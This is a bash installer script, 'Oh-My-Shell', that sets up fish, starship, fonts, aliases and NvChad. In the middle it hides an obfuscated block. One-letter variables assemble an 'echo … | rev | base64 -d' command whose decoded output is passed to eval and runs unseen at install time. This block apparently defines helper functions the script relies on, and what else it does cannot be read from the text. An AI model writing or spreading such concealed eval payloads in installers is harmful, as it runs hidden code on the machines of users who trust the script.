#!/bin/bash

# Oh-My-Shell
# Version    : 1.0
# Description: Empower your terminal with the might of fish and oh-my-fish
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : Fish, Oh-My-Fish
# Date       : 24-12-2022
# Language   : Shell
# If you copy, consider giving credit! We keep our code open source to help others


black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
nc="\033[00m"

script="$0"
version="1.1"

logo="
${green}  ___  _           __  __            ____  _          _ _
${blue} / _ \| |__       |  \/  |_   _     / ___|| |__   ___| | |
${red}| | | | '_ \ _____| |\/| | | | |____\___ \| '_ \ / _ \ | |
${yellow}| |_| | | | |_____| |  | | |_| |_____|__) | | | |  __/ | |
${cyan} \___/|_| |_|     |_|  |_|\__, |    |____/|_| |_|\___|_|_|
${green}                          |___/                     [v${version}]
${blue}                                            [By KasRoudra]
${nc}"


default_user="Fish"
fish_config="$HOME/.config/fish/config.fish"
bash_config="$HOME/.bashrc"
zsh_config="$HOME/.zshrc"
starship_config="$HOME/.config/starship.toml"
nvim_config="$HOME/.config/nvim"
termux_config="$HOME/.termux"

pacmans=(
  "pkg"
  "apt"
  "apt-get"
  "dnf"
  "yum"
  "zypper"
  "brew"
)

packages=(
  "git" 
  "fish"
  "figlet" 
  "exa"
  "starship"
)

termux=$(cat << EOF
alias updt="apt update"
alias upgd="apt upgrade"
alias updg="apt update && apt upgrade -y"
alias inst="apt install -y"
alias rem="apt remove"
alias pur="apt purge"
alias info="apt show"
alias orphclean="apt autoremove"
alias srch="apt search"
EOF
)

debian=$(cat << EOF
alias updt="sudo apt update"
alias upgd="sudo apt upgrade"
alias updg="sudo apt update && sudo apt upgrade -y"
alias inst="sudo apt install -y"
alias rem="sudo apt remove"
alias del="sudo apt purge"
alias info="apt show"
alias cln="sudo apt clean"
alias oren="sudo apt autoremove"
alias srch="apt search"
EOF
)

arch=$(cat << EOF
alias updt="sudo pacman -Syy"
alias upgd="sudo pacman -Suu"
alias updg="sudo pacman -Syyuu"
alias inst="sudo pacman -S"
alias rem="sudo pacman -R"
alias del="sudo pacman -Rns"
alias info="pacman -Qi"
alias oren="sudo pacman -Rns (pacman -Qtdq)"     # orphan clean
alias srch="pacman -Ss"
alias pacsyu='sudo pacman -Syu'                  # update only standard pkgs
alias pacsyyu='sudo pacman -Syyu'                # Refresh pkglist & update standard pkgs
alias yaysua='yay -Sua --noconfirm'              # update only AUR pkgs (yay)
alias yaysyu='yay -Syu --noconfirm'              # update standard pkgs and AUR pkgs (yay)
alias parsua='paru -Sua --noconfirm'             # update only AUR pkgs (paru)
alias parsyu='paru -Syu --noconfirm'             # update standard pkgs and AUR pkgs (paru)
alias unlock='sudo rm /var/lib/pacman/db.lck'    # remove pacman lock
alias cleanup='sudo pacman -Rns (pacman -Qtdq)'  # remove orphaned packages

# get fastest mirrors
alias mirror="sudo reflector -f 30 -l 30 --number 10 --verbose --save /etc/pacman.d/mirrorlist"
alias mirrord="sudo reflector --latest 50 --number 20 --sort delay --save /etc/pacman.d/mirrorlist"
alias mirrors="sudo reflector --latest 50 --number 20 --sort score --save /etc/pacman.d/mirrorlist"
alias mirrora="sudo reflector --latest 50 --number 20 --sort age --save /etc/pacman.d/mirrorlist"
EOF
)

redhat=$(cat << EOF
alias updt="sudo dnf check-update"
alias upgd="sudo dnf upgrade"
alias updg="sudo dnf check-update && sudo dnf upgrade -y"
alias inst="sudo dnf install -y"
alias rem="sudo dnf remove"
alias del="sudo dnf remove"
alias info="dnf info"
alias cln="sudo dnf clean all"
alias oren="sudo dnf autoremove"
alias srch="dnf search"
EOF
)

suse=$(cat << EOF
alias updt="sudo zypper refresh"
alias upgd="sudo zypper dist-upgrade"
alias updg="sudo zypper update && sudo zypper dist-upgrade"
alias inst="sudo zypper install"
alias rem="sudo zypper remove"
alias del="sudo zypper remove"
alias info="zypper info -t pattern"
alias cln="sudo zypper clean -a"
alias oren="sudo zypper autoremove"
alias srch="zypper search"
EOF
)


color=0

info() {
  if (( $color % 2 == 0 )) ; then
    echo -e "${yellow}[${white}*${yellow}] ${cyan}${1}${nc}\n"
  else
    echo -e "${green}[${white}+${green}] ${purple}${1}${nc}\n"
  fi
  (( color++ ))
  sleep 1
}


ask() {
  printf "${yellow}[${white}?${yellow}] ${blue}${1}${green}"
  sleep 1
}

success() {
  echo -e "${cyan}[${white}✔${cyan}] ${green}${1}${nc}\n"
  sleep 1
}

error() {
  echo -e "${blue}[${white}✘${blue}] ${red}${1}\007${nc}\n"
  sleep 1
}

handle_interrupt() {
  success "Thanks for using. Have a good day!"
  exit 0
}

doas() {
  # Check for sudo
  if [ -x "$(command -v sudo)" ]; then
    sudo $@
  else
    eval $@
  fi
}


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=IyVRJHJyMGSkgHJxBjTkICIsFmdlpQKiAnW4RSVkwEJXFlckoXOWRydkYGJwpFekYHJyMGSkIGJ3RyckQGJXFlckMGJ3RiMjhEJiACbhZXZoQSP4pgIi0Dcah3OiMHZFJSP4R1OiwHI2JSPitjIlJSP3tjIiJSP2tjIi0Tcw40OiYWZi0zYKtjIk1CIi0TV7IiZpJSPjhDU7IiNi0je5Y1Oi8mI9Q2OiUWYi0jZFN2OiMXYwJSPFN2a7IychJSPmtjIi0jMjh0OiMnI9oEeItjIyBCfgciWwcGMQNlSGp1QJdTYwAzdQNlS0U1Mvl2Ty0UOJ1mTvlka01EUTlEMJpGd5VlVjlTSpl0NatWV4B1UKNXVTl0NjpHMpl0QkBXWxolVlZlSwR1Vw9mUV9GMVxmTqRmeSZ0UtxmQRJjSvdFboF2UyQHcThFZ3JVbWJnVVp1SUZlS1YFbKt0UF9mMidEcXFmMOl0UtFzURJjToFWRotUTspEcUdFcvJVVwBXVux2ahBTMJNVb0NVZWp1UTtGaLFGbKVjWHRnSlxGbKVVbspkWzQGWXRlSXJFM0JXTFJFbTBDbwNFVsJkYsNGMkdEcKVGbKhVVtt2dSdkVWR2Rwp0TFpEcad0a3FGbrNzUW5UYhRlQ2oFRkpUYWxGcNdEcr5EMsB3UUxmRTVUMQR2RwpkYWpFdTRFbOJmVNNzUV5UYkVkRwNFVsZVTVlDcXZFZoFGVCZzVUJlQNVVOwd1Vwp0TXlTWUFDZwE2asJzUs5UUhNjUxN1V4dkYVtWNXZFZTFmbSF3UYB3RSJjTw1kRSNVYuFVeUJDbOdlRsBXTHBXYOBDbwNFVspUZsxmSkdEcKV2awRVVFR3bTZUTzM1VspmWzQWSTdVN2J1axUXUrJlVWhkQyVVbG9kVW1keSVFZORmMOlkVWJ1dSVVNXRlbwl2YExmcUVVNzZlROBjTUJUaT5mQIpVR1MUTWZ1SRxmUUNmVKllWWpVYNZ1axEWMWh2UtJVcWNjSXJVbWJFVthHVlxWW4ZVVwtWZstmMRxmUoN1a1Y0VrBDeNZUS4VFVCplUwoUSVFjUrJFbwRkUrplTjNDaWZVRodUYtZUcXtmVq10R4NXWtVUNWZlUwMmRW5EVsB3cWVUN3J1axoXVqZ0VkZkW2U1a0gnYWpENTpmRoF2MCh1VYR2MSFjSVdFbaZlTFp1RUhlTHFGbWpXVsRGahhkU0ZFMsNnYFFjcORlQXJ1MoRHVWpFMSFDcMNWRa5kUxk0dWZFaTJmVGNVUrJVakVFc0R1V0NnYWxWShVEZUl1VSZ0VqpVYWxWS3JVbwZ1YxoEWZdFawImVkpkYHhnThBDczZlboJkYtZ1cXtmVhlFVGZVVqZkVXZEZxIFbW9EVtJ1cWRkTHZVMKBFZHRHWlhEZIZVMwtmUsBHRStmWONmeWR3VYhmWSdlRwZVb4RlUVRDeW1GdLZlVsdlTVZlaWFjSzVlModkUx40UiRkTXd1RnlXVWJ1VSdlTzIFbadFVwoFWXhFZ2JFbOVVYHhHVSdkUzVlbNFjUxoFWhdUMYF2MoRXVww2TNZlWyNFbWZFZzQGdZxmSXJmRSx0YHhnTORlUYZ1MS9WTyoEVT1GcWRWV1gFVW5ENNZEb5NmRWh1VHJ1RXxmThZ1axMzYGhWYSFjS0ZFM1clVVRDeidEepFFbaVlVGdWMNdkUvZVb0VFVIJ0VUhlTvZFbklVVtFjUVtmSFllbWtkVwEDSStGZhZFWohUVxcGeSFDcEJ1aa50Y6ZFdXhFaaJ1VGBnVthHVSVFN4ZVb0tkVWZ1MkJTMpVFbaNnVFR3TNVVMQFGRGd1VHdmeVJDb0IlMKFjUsp1VUNjQyZ1MkplUWpUVaVkWhFFMadEVY1UMWFjVX50V0RlVFBXRaZEcT1kVKJ3YGZ1VlVkRZplROdnYW5kdSpmSol1VoZlVzwmUixmTTF1aSlmTspFdV1Gd3ZFbSdkVsJ1aXpmV0VVVSdUTspFTPZFZVZFWCJnVyg2VhFjTLRFbalWY6V1dWtGZ0IWVxcFZFRWYTNjQHRVVkNVTGZVWV1WMSV1aKVUWuZ1RWxmWQN2R0hFZxwmRZFjSPFGbal1UthnTS1mUZZFWWRjUxYVcWtmVpRmM4dVWtVzbXZkU6VGRKlWVuJFSZVFeHZVMahUVqJ0VkdEaJRFbOtUYs5kMW1GeoR1MCh0Vsh2aXdkVZFWRWpWZrB3RURlQLdlRWlVZGRmWhxmWyVFMW9UTWplcTxmVWR2MkRXWsp0ViZkUMRVb4xmYyc2dW5mUTJ2VW9GZEpEaNRlQWZVbGtkVsRWeWxmUrdlaFl3VqFFeSdlS69kVkZ1YUZlRZ1GaDJ1RKZEVrpFWWBTN1ZFWkNjVwEDVlVEZhNWRZlXWXZ0bWZFZ1U1VxQFVrBXcVpnQH10VGB1YHRHWkFDbGlVMKtUZtZ0MSZFZX5URaFnVFNWMWdlSwp1R0Z1VXJ1RWBzc1EWMaRDZ6pkThFjWGlVV4dnYFFDUVxGaYRWVwZEVs50ShxmTyYVb4hGVzIESXxGavJWbOVlWEZkWNVEb0ZlbkdUYsx2RV1WMUlVVKFXVrZ1TWxWW3NmRWdFZwYVcZFjUhJmRSN1Uqp0UVJzZ4ZFbsdXTGJFWStmUpV2aVhXWVlzdhFDZzcVVWpWVuJUSXtmUXJ1awc3Vq5kVWJDaYd1Vw9kUHZkWaVkWXFlesJ3VYJ1dNdkUxpVRWFmUUxmRWBjTLZFbkllUuBnUVtmSFl1axskVspFVjVkVhZ1aKllVyY0UhFjRZNlaKdFV6ZFWWZVWxEWMOh2UsJFUVJjUzllbkNVYspFNRdVNpVVbSdUWrZ1USBTMIFFbohFZYdWeWxmUrFWMWZDVqZEaiNjQyZ1MkplUWpUVWpmRqRWMsdFVYRWYXZkW5F2RxQFVzIUdVVFaP1kVap3Ush2VlVkRZplROdnYW5kdSpmSol1VoZlVzwmUixmRvp1R4ZFZwY1VWtWOHJVMwd1YFpFWXpmVYZFVFdnUXpkeXxGaXdFSoRXVyY0SSZEchVlaGNVYzIUdWhlS0IlMSBnVrZVYTNjQzRFVVBTTsZlWhdUMWFmRZhXWUZkWSxmWMJFbkp1UVp1VaZFarJVbGVEVsp1UjpnV0dFWwJlUyoEaTtmUrJVV1MHVUJ0aiZkV1ImM0xWVzIFSX5mSXJ2VGhVYGpFWXhUQ4ZlRotWYxokTTxGZOJlMoR3VWx2ShFjVWpVRaFWVyEFeVtmWDFGbalXVtFDVZVFcVR1MW9UTWpldjRkQXJFMJpHVWJ0VSxGc3NVbxMFZycHeW5mUT1UMGdlUrJVakZFcHZ1a5MnYWJ1VjVkVXdFRWRXVwgWYiVUMM5kVkdlVUV1dVJDdXZ1a1EmWHhXaZVVNzZFWkNjYVFDaV1GdUNWR1gEVVR3UNZlWZVVbxgWYXJ1cVpnTTJVbKJ3YEZkWkJTOWZVMoRjYWJVTStmWONWMaZjVGh2Rh1mRzdVb4h1UVRDeW1GdhJGbkNDZyEjTZZlSyV1MC9kVwEDTRpmTWdlRKRnVsR2QSdkVx8kVWNVYygGWXhlT3JFbOVlWFpVYN5mQzRVV090VGx2RVpmSolVV1EnVGp1aNZlSyNmRWplVrpVcUdlRTFWMOdHVsRmTTBTS6ZlVo9UTtJFWWtmVpRWV1ckVz40ciZFb4VWRkR1VqZESaVEdHJ1axonYGRmVkhEaYd1Vw9WYxYUMStmWO1ESCZlVuxmdW1mTQVVb4R1YwoFdURlVK1kValUYEpEVWZ0b3llaRVTTGpFNXZlWhNWb4dlWWp1SSZEc1M1aklmUygHWWhVSxEWMOhWUtB3USVFN4ZVb0tkVWZ1MkJTMpVFbaNnVFR3dStWMIVlaCZ1VGpEdVZlSDJ1RKFjUsp1VUNjQyZ1MkplUWpUVaVkWhFFMadEVY1UMWFjVX50V0RVWVpUcVtmVP1kVaJ3UsZlVkNDZ0lFbKdlYGJFTjVkWOJVMJdnVWh2UiZlRTFlbwhWTWx2RZ1Gdw0EbsNzTGRGbZdlUHpFRKdlYGpVdW1GcVZFWCZVWXB3VWVFN4J2R45kTFpFWWhEbaJ2ROlVVthXVXhlQHRVVkNVTGZVWV1WMSV1aKVUWuZ1RWxmWQN2R0hFZxwmRVxmUrJFbwRkUrplTjpnVYZlVZFTYx4EaR1GcTJVV1ckVxA3UWZkUYFmRklmYGplRZVFd3J1axgUVqJkVXZkS0VlVKNkUHpUMSxmWXR1MCJnVzQmWSZlSVpVRaFWUwo1RUhVTxYVMWdlTXRHVZVlSxV1aW9UTWplcTxmVWR2MkRXWrVzaWVVN3NVbxMVWWpUWWNDbWJVRxUlVrZlaUZlS0pVV5MXTWJlRlRkSTlFVGhlV6V0dhFjW2NmRkFmUUZlVWFjQXFWMOZ0YGpVaZZlSVZFSk52VHpUUV1GeTdlbCNXWtlzcNZkVZVVbxIVVrpkNZRlQG10VGBVTXRHWjh1Z5VFboNVTG9GeTZlWplFVWhlVWlVMWdlSo5UVkh2UrRDeW1GdLZlVWNDZyETahNjQ1ZlRvVjVWpETV1GdYRGSCdEVrVzQSdkVw8UVWdlUyg3VWNDZ2JlVahmTXFzVTZEczRlVkd0UGB3RhRkSUZVR1U0VrB3TSxmW2RFbWFmVthWWZxmQXJmRkx0YEZkThJzd3ZlVW9WTsZ0UT1GcYRmVKhEVXlzdNZEbGpVRkx2VGl0dXpWR3FWMaZXTUpUVWZFcWZVMCdVYx4kRjZkWpllVKZjVVpFMSBTNTR2RxUFZIJ0RUVFZTFWMkBTVqpkTUtmWFlFWRVjUWpFSidEeYR2VohVVxI1US1mRFJVb45UWUZFSX5GZuJmVOFVVrZVaThkQXlVb09UZspVSidEesVlRad0VuJ0TWBTMoF2R4hlVWlUeWdFaXZFbRdnUUZEaUpnR0Z1MwJVTspUVadEeYJlRahlVqFVMSFDczImM4RVWUZEdWVlVPJFbaZXVtBnVj5GaYlFbCNlYGpUYidEesNWbnpnVrh2cWtWNU10VxgFZWpESUdVO31kRSd0YFZ1UZRlRIdlbvdnUVBDMjZEZhJVboRXVxI0UNdURwoFRGN1VspVVWZEZvJ2VKJXUtBHWTNjQXlFbONVTGZlVhRkSSV1awFnVzY1USBTM2NGRCVlUWBnVVFzZ4JlMW1UTXRnTWBDc1dFWkplVXpEaUtmUhN1a1ckVtVzVWZkUYFmRklWVuJFdWVEd3J2RWVXYE50VSd1Z5VlVKtkVGN2dPVkVXJlM4NnVzo0dWVVNWpVRWFWUwo1RUhVTxYVMWpVZGRGWZVlSxV1aW9UTWpFaV5GcWJlboRXWsJ0VhFjUhNWRa5kUxokcWNjUTJmVGNVUrJVakVlWXZ1a5cXYxMmMaVEZsdlRKZUWVJ1RiVUMoNmRkZFZYhGWWJjR3N1RGZEVrp1VjJjUzZlbspkYHZVVjdUMUNGMaRHVUZlTlxmWJR1ak9UVzIFSZ5mVHZFbaB1YHRHWkFDbGVFbStmUsBHRStmWONmeGhlVYlUMhFjToNGRKhmTHFFeV1mRPZlVWNDZyETaVxmWzZVR0dnUrFDSVpmQWdlRKRXVWp0QSdkSx8UVWNlUyg3cWNDZaZVV1klWHRHWSVkWHRFWNFjVxY1VOdFdUlVVKFXVrZ1TNZlWyNFbWZFZzQGWZxmSwImVSx0YHhHaj12Z6Z1aoNlYWZ0VT1GcYVmRsdUWtR3RWFDcZJFbaxWWXJ1RaRkS3J1axknVuBnVXVlSZl1VsdnUyokSiZkWoFWbSR3VrJ1SWdlVLNWRkt2UspFWV5mWzZlROFTTWZFaVVkSFlFWFhXYyY0MhFDZUNmVKlVWsZ0TiZkT2RFbkx2UtJVVXh1awEWMKJFVthHVNJDeHZFM1MXTsJVNOdEdTlFWChEVYJ0cNZlWXJGRKVVZVZ1VUBzb4JFM5c3TWZlTXxmWVdlbGNkVHZEUiZEZU1UMWdUVtlzdSFjVVNWRWpWWXhHWVpnTaJFbaNTYxQGVSVkW2kVVwdnUyIVTidEesRmM0RnVxg2cW1mRRF1aS9UTwUDSW5GZyZVMOhXVtVjTVVVNzV1MCNXYyU0dUtmUWZFSCZUWrB3dSJjU3FlaGZ1UwAXVVBDbrd1RGFlUtBnVNVUR4ZVV0FWYxQmSNZlVoVVR1UUWXh2TSFjSzEWMkRlYrpUSUxmRPZFbWJzYFpFWZdFa0dVVSdkVXZETWtmVoNGVGZVWW50ThxmTJ1EVChWYuhGdVxGb31kRKNFZEpkWOV1b4RVV0tmVW5UeUpmRTRVb4VXVww2cNdlRzd1aWpWTzE0dVxGcwIVMvFzUqZ0VVd0Z4llbK9kUyoEShdEeUJVbRpXWWR2TiZUV3llM4lWUtdXeVFjSDN1RKJXTXFzUl12d3VVVwBjUxoFeTtmVsNlMnd3Vup0TNZlSPJ2R1Q1UYJkcWZFZzdlRNVTWw4kShRlQ2klekpUVxYleTxmTRVmRWJ3VqRmShV1a1kVMaZVZYJVcTRlQKVVMC5EZHBnSiBTN0NFVs5UTrlDcipnTW5URwRVVIN2dNdURzMVVOFmUrBHVVRkQu1kRv5WSId3ZjlWS3MFSotEUTpkeJpGdJlleJlTSpl0NapGMplFWNl2TyQnaSRFMpN2RGpXSqRnaSdVW5kUbGxWSqR3aQNlS2lka0d1TY9WOJpWWp9UMBRTW6BTahdVWp9UMVlTSpFEdaNUS3MVbNlTStZVbJpGdP1ESFlTSpl0NkpGMplVaJdDZ6BTaaNVS3klawkGZpJEOJpGdVVGRwkmUXJleJpGd0clbBlTSpl0SlREMrt0RWJTWXd3ZJlmUJlleJtGZ5JlaKhkSSZVeStmSI10aklnUppURopWTpJlMKhEahN2QS1mSIN2aWpGb2oESKJlV5JVTKZUVrVmRwdXSpt2SahlWoJ2QBlmSFRzdjNlU0oURopWTpJVeVZ1YpdCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"

welcome() {
  if $is_termux; then
    pkg update && pkg upgrade -y
    if [ "$?" -ne 0 ]; then
      error "Termux update failed!"
      exit 1
    fi
  fi
  clear
  echo -e "$logo"
}


install_packages() {
  # Install required packages
  for package in "${packages[@]}"; do
    if ! $(is_installed "$package"); then
        installer "$package"
    fi
  done
  # Install lolcat
  if ! $(is_installed lolcat); then
    info "Installing Lolcat...."
    for try in 0 1 2 3; do
      if $(is_installed pacman); then
        doas pacman -S lolcat --noconfirm
      elif $(is_installed pip3); then
        doas pip3 install lolcat
      elif $(is_installed gem); then
        doas gem install lolcat
      else
        is_installed python3 || installer python3
      fi
      if [ $try -eq 2 ]; then
        installer ruby
      fi
      is_installed lolcat && break
    done
  fi

  for package in  "${packages[@]}"; do
    if ! $(is_installed "$package"); then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
  done
}

clone_repo() {
  if $(is_installed lolcat); then
    clear
    echo -e "$logo" | lolcat
  fi

  if ! [ -f files/config.fish ]; then
    info "Cloning Oh-My-Shell.......\n"
    git clone https://github.com/KasRoudra/oh-my-shell.git
    cp -r oh-my-shell/files files
    rm -rf oh-my-shell/
  fi
}

backup_configs() {
  NOW=$(date "+%F-%H-%M-%S")
  if [ -e "$fish_config" ]; then
    info "Creating backup of fish config......."
    cp -r "$fish_config" "${fish_config}-${NOW}"
  fi
  if [ -e "$starship_config" ]; then
    info "Creating backup of starship config......."
    cp -r "$starship_config" "${starship_config}-${NOW}"
  fi
  if [ -e "$nvim_config" ]; then
    info "Creating backup of nvim config......."
    cp -r "$nvim_config" "${nvim_config}-${NOW}"
    rm -rf "$nvim_config" "$HOME/.local/share/nvim"
  fi
  if [ -e "$is_termux_config" ]; then
    info "Creating backup of termux config......."
    cp -r "$is_termux_config" "${termux_config}-${NOW}"
  fi
}

install_configs() {
  argname="$1"
  if [ -z "$argname" ]; then
    ask "Enter your name to be displayed in home ${cyan}==> " 
    read name
    echo
  else
    name="$argname"
  fi
  if [ -z "$name" ]; then
    error "No name! Name defaults to $default_user"
    name="$default_user"
  fi
  if ! [ -d "$fish_config" ]; then
    mkdir -p $(dirname "$fish_config")
  fi
  # Global fish config
  cat files/config.fish | sed s/"Fish"/"$name"/g > "$fish_config"
  # Set aliases for specific distro
  if $is_termux; then
      echo -e "$termux" | tee -a "$fish_config" "$bash_config" "$zsh_config" &> /dev/null
  elif $(is_installed apt); then
      echo -e "$debian" | tee -a "$fish_config" "$bash_config" "$zsh_config" &> /dev/null
  elif $(is_installed pacman); then
      echo -e "$arch" | tee -a "$fish_config" "$bash_config" "$zsh_config" &> /dev/null
  elif $(is_installed dnf); then
      echo -e "$redhat" | tee -a "$fish_config" "$bash_config" "$zsh_config" &> /dev/null
  elif $(is_installed zypper); then
      echo -e "$suse" | tee -a "$fish_config" "$bash_config" "$zsh_config" &> /dev/null
  else
      echo
  fi
  echo "eval \"\$(starship init bash)\"" >> "$bash_config"
  echo "eval \"\$(starship init zsh)\"" >> "$zsh_config"
  # Set starship for termux
  if $is_termux; then
    cat files/starship.toml | sed s/"\[\$hostname\]"/[Termux]/g  | sed s/"\[\$user\]"/[$name]/g > "$starship_config"
  fi
}

configure_packages() {
  # Fonts and colors
  if $is_termux; then
    info "Changing font..."
    cp files/MesloLGS-NF.ttf "$HOME/.termux/font.ttf"
    info "Changing colorscheme..."
    cp files/colors.properties "$HOME/.termux"
    termux-reload-settings
    sleep 1
  else
    info "Installing font..."
    cp files/*.ttf "$HOME/.local/share/fonts/"
    fc-cache -f -v
  fi
  # Git settings
  info "Configuring git for no pager..."
  git config --global pager.diff false
  git config --global pager.log false

  # Change shell to fish
  if ! echo "$SHELL" | grep -q "fish"; then
    info "Changing Shell..."
    if $is_termux; then
      chsh -s fish
    else
      chsh -s $(which fish)
    fi
  fi
  
  # Install NvChad configuration in neovim
  if ! $(is_installed nvim); then
    installer neovim
  fi
  info "Configuring neovim"
  git clone "https://github.com/NvChad/NvChad" "$nvim_config"
}


final(){
  if ! [ -d ".git" ]; then
    rm -rf files
  fi
  if $is_termux; then
    rm -rf $PREFIX/etc/motd*
  fi
  info "Installation completed. Run nvim to set it up!"
  sleep 2
  echo
  success "Restart session to see effects!"
  sleep 5
  clear
  exec fish
}

usage() {
  code="$1"
  head="$green"
  header="$cyan"
  body="$yellow"
  USAGE="${head}USAGE:
   ${header}./${script} [options]
  
${head}OPTIONS:
   ${header}-h, --help                 ${body}Shows this help
   ${header}-v, --version              ${body}Shows script version
   ${header}-n NAME, --name NAME       ${body}Set fish username
    
${head}EXAMPLE:
   ${header}./${script} -n KasRoudra"
   
  ALL="${head}NAME:
   ${header}Oh-My-Shell
  
${head}DESCIPTION:
   ${header}Empower your terminal with the might of fish. Fast and lightweight shell with autosuggestion, syntax highlighting and awesome starship prompt
  
$USAGE
   
${head}COPYRIGHT:
   ${header}KasRoudra (2023)

${head}LICENSE:
   ${header}MIT

${head}VERSION:
   ${header}${version}
"
  if [ $code -eq 0 ]; then
    echo -e "$ALL"
  else 
    echo -e "$USAGE"
  fi
}

main() {
  name="$default_user"

  # Termux
  if echo "$HOME" | grep -q "termux"; then
    is_termux=true
  else
    is_termux=false
  fi

  # Prevent ^C
  stty -echoctl

  # Detect UserInterrupt
  trap "handle_interrupt" 2
  
  while [ "$#" -gt 0 ]; do
    case $1 in
      -n|--name)
        if [ -n "$2" ]; then
          name="$2"
          shift
        fi
        ;;
      -h|--help)
        usage 0
        exit 0
        ;;
      -v|--version)
        info "${cyan}Version: ${green}${version}"
        exit 0
        ;;
      *)
        error "Unknown option $1!"
        usage 1
        exit 1
        ;;
        esac
    shift
  done
  welcome
  install_packages
  clone_repo
  backup_configs
  install_configs
  configure_packages
  final
}

main $@